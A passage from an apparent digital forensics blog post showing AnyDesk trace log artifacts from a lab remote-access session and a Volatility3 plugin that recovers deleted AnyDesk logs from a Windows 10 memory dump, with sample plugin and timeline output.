242)">(</span><span class="token plain">parent </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                      app.service - Creating an IPC accept socket.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                      app.service - Connected to </span><span class="token number">6572</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">control:1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                      app.service - Process login detected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                      app.service - Using existing control </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">6572</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">14</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">13</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.601       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">                      app.service - Process start: </span><span class="token number">3524</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">frontend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.601       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">           anynet.relay_connector - Short timeouts enabled.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.742       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">                      app.service - New IPC connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.742       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">15</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.742       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                      app.service - Creating an IPC accept socket.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.742       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                      app.service - Connected to </span><span class="token number">3524</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">frontend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:49.139       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                      app.service - Process login detected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:49.139       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">16</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">15</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:50.477       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                            gcpsa - Downloading gcapi.dll.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> error </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:50.518       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                 win_app.dir_file - Could not </span><span class="token function" style="color:rgb(80, 250, 123)">open</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">file</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:50.518       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">17</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">15</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:50.918       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">                       fiber.scheduler - Fiber </span><span class="token number">17</span><span class="token plain"> terminated.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:51.175       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">18</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">13</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:51.586       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">           anynet.main_relay_conn - Reporting system information.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:52.221       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">                       fiber.scheduler - Fiber </span><span class="token number">18</span><span class="token plain"> terminated.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.131       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">4</span><span class="token plain">                  fiber.scheduler - Spawning root fiber </span><span class="token number">19</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.131       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">19</span><span class="token plain">            anynet.connection_mgr - </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">192.168</span><span class="token plain">.164.130:49152</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Incoming connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.147       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">19</span><span class="token plain">                  fiber.scheduler - Spawning root fiber </span><span class="token number">20</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.272       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">19</span><span class="token plain">                  fiber.scheduler - Spawning root fiber </span><span class="token number">21</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.287       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">19</span><span class="token plain">                        handshake - Using protocol version </span><span class="token number">1</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.287       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">19</span><span class="token plain">            anynet.connection_mgr - </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">192.168</span><span class="token plain">.164.130:49152</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Direct connection.</span><br></span></code></pre></div></div>
<p>We can see that it is possible to extract useful artifacts.
Hereby is a non-exhaustive list:</p>
<ul>
<li>AnyDesk version</li>
<li>The IP address of the AnyDesk relay used when initiating a connection</li>
<li>Timestamps of each action</li>
<li>Listening port</li>
<li>Incoming connection IP address</li>
<li>Involved PIDs</li>
<li>Number of monitors found</li>
<li>Install date</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-anti-forensics-scenario">The anti-forensics scenario<a href="#the-anti-forensics-scenario" class="hash-link" aria-label="Direct link to The anti-forensics scenario" title="Direct link to The anti-forensics scenario">​</a></h2>
<p>If the adversary is aware of those artifacts, he might delete those files. However, there is still a chance to retrieve those cached files in memory!
In this example, our is setup is 2 windows 10 virtual machine (<strong>A</strong> and <strong>B</strong>). <strong>A</strong> (attacker) is initiating a remote anydesk connection to <strong>B</strong> (victim).
After a while the session is disconnected and A deleted the ad.trace and ad_svc.trace files.
Next, a memory dump of machine <strong>B</strong> is performed, ready to be analyzed.</p>
<div style="background-color:white;align-items:center"><p><img decoding="async" loading="lazy" alt="alt text" src="/assets/images/scenario-9761799e8d300f51d09bbbf7ad5e290a.png" title="Investigation scenario" width="1829" height="1007" class="img_ev3q"></p></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="writing-a-volatility3-plugin">Writing a Volatility3 plugin<a href="#writing-a-volatility3-plugin" class="hash-link" aria-label="Direct link to Writing a Volatility3 plugin" title="Direct link to Writing a Volatility3 plugin">​</a></h2>
<p>Using volatility3<sup><a href="#user-content-fn-5-026302" id="user-content-fnref-5-026302" data-footnote-ref="true" aria-describedby="footnote-label">5</a></sup> we can write a custom plugin which will perform the following steps :</p>
<ul>
<li>Look for ad.trace and ad_svc.trace using the filescan plugin;</li>
<li>Try to dump the files if found;</li>
<li>Parse the files and render the data to the investigator.</li>
</ul>
<p>Indeed, we could just dump the file and analyze it offline. However, writing a dedicated plugin is useful to:</p>
<ul>
<li>Interface with the Timeliner plugin and make timestamps correlation with other artifacts;</li>
<li>Interface with any other tools that are exploiting the other volatility3 output capabilities (json, csv, ...).</li>
</ul>
<p><em><strong>Plugin output example</strong></em></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/Memory Analysis/MemoryImages/Windows10_AnyDesk » vol </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-f</span><span class="token plain"> Windows_AD.vmem anydesk</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility </span><span class="token number">3</span><span class="token plain"> Framework </span><span class="token number">2.0</span><span class="token plain">.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  </span><span class="token number">100.00</span><span class="token plain">		PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Source	Type	Time	Context	Message</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:14:32.854000 	gsvc	Main relay connection established.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:14:32.854000 	gsvc	New user data. Client-ID: </span><span class="token number">684537884</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	error	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:14:32.954000 	gsvc	packet-type</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">60</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.766000 	gsvc	Spawning root fiber </span><span class="token number">37</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.766000 	gsvc	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">192.168</span><span class="token plain">.164.130:52257</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Incoming connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.766000 	gsvc	Spawning root fiber </span><span class="token number">38</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.867000 	gsvc	Spawning root fiber </span><span class="token number">39</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.867000 	gsvc	Using protocol version </span><span class="token number">1</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.867000 	gsvc	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">192.168</span><span class="token plain">.164.130:52257</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Direct connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.926000 	gsvc	Backend PID: </span><span class="token number">1268</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre></div></div>
<p><em><strong>Using the timeliner plugin</strong></em></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[...]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Fiber 20 terminated.  	2022-09-27 15:30:21.968000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Fiber 20 terminated.  	2022-09-27 15:30:21.968000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Starting installation of AnyDesk.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Opening UAC dialog.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info line: &quot;C:\Users\Volatility\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\AnyDesk (1).exe&quot; --install &quot;C:\Program Files (x86)\AnyDesk&quot;  --start-with-win --create-shortcuts --create-taskbar-icon --create-desktop-icon --install-driver:mirror --install-driver:printer --update-disabled --svc-conf &quot;C:\Users\Volatility\AppData\Roaming\AnyDesk\service.conf&quot;  --sys-conf &quot;C:\Users\Volatility\AppData\Roaming\AnyDesk\system.conf&quot;  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Starting installation of AnyDesk.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Opening UAC dialog.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info line: &quot;C:\Users\Volatility\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\AnyDesk (1).exe&quot; --install &quot;C:\Program Files (x86)\AnyDesk&quot;  --start-with-win --create-shortcuts --create-taskbar-icon --create-desktop-icon --install-driver:mirror --install-driver:printer --update-disabled --svc-conf &quot;C:\Users\Volatility\AppData\Roaming\AnyDesk\service.conf&quot;  --sys-conf &quot;C:\Users\Volatility\AppData\Roaming\AnyDesk\system.conf&quot;  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SymlinkScan	Symlink: Global -&gt; \BaseNamedObjects	2022-09-27 15:30:37.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 380 svchost.exe Loaded rsaenh.dll (C:\Windows\system32\rsaenh.dll) Size 208896 Offset 140735643516928	2022-09-27 15:30:40.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 380 svchost.exe Loaded CRYPTBASE.dll (C:\Windows\System32\CRYPTBASE.dll) Size 49152 Offset 140735649873920	2022-09-27 15:30:40.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 3680 explorer.exe Loaded LINKINFO.dll (C:\Windows\SYSTEM32\LINKINFO.dll) Size 53248 Offset 140735555567616	2022-09-27 15:30:41.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PsList	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PsList	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PsScan	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PsScan	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 380 svchost.exe Loaded SHELL32.dll (C:\Windows\System32\SHELL32.dll) Size 21954560 Offset 140735700271104	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 3680 explorer.exe Loaded EhStorShell.dll (C:\Windows\System32\EhStorShell.dll) Size 225280 Offset 140735394414592	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 9068 AnyDesk.exe Loaded AnyDesk.exe (C:\Program Files (x86)\AnyDesk\AnyDesk.exe) Size 16338944 Offset 19005440	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 9068 AnyDesk.exe Loaded &lt;volatility3.framework.renderers.UnreadableValue object at 0x1464d7520&gt; (&lt;volatility3.framework.renderers.UnreadableValue object at 0x1464d7520&gt;) Size 2019328 Offset 140735723339776	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 9068 AnyDesk.exe Loaded wow64.dll (C:\Windows\System32\wow64.dll) Size 339968 Offset 140735698370560	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 9068 AnyDesk.exe Loaded wow64win.dll (C:\Windows\System32\wow64win.dll) Size 507904 Offset 140735699550208	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 9068 AnyDesk.exe Loaded wow64cpu.dll (C:\Windows\System32\wow64cpu.dll) Size 36864 Offset 2002452480	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NetScan	Network connection: Process 9068 AnyDesk.exe Local Address 0.0.0.0:7070 Remote Address 0.0.0.0:0 State LISTENING Protocol TCPv4 	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info * AnyDesk Windows Startup *  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info * Version 7.0.14 (release/win_7.0.x 5cf8483107cd52198359a9504e0641fbe8cc59b3)  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info * Custom Client (no ID)  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info * Checksum 1b8e6bc34e8cd533b5d7281935ff2761  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">​</a></h2>
<p>This plugin was tested on Windows 10 memory dumps and the code can be found on the forensicxlab github : <a href="https://github.com/forensicxlab/volatility3_plugins" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/volatility3_plugins</a>.
